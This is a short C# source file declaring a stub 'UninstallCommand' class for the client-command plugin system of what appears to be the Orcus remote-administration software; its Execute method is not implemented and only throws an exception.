using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Client
{
    public class UninstallCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0x8f4791f7, 0x412b, 0x4b48, 0x97, 0x8d, 0x8e, 0x2a, 0xb0,
            0x02, 0xc3, 0xa8);

        public override string Name { get; } = Resources.StaticCommands.Client_UninstallCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_UninstallCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}